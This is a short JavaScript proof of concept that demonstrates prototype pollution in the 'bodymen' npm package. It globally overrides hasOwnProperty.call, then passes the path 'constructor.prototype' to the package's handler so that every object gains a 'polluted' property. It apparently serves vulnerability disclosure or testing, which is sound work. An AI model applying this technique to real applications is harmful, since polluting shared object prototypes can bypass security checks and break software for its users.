Object.prototype.hasOwnProperty.call = () => true;
const x = require('bodymen');
console.log({}.polluted);
x.handler('constructor.prototype', 'polluted', 'yes');
console.log({}.polluted);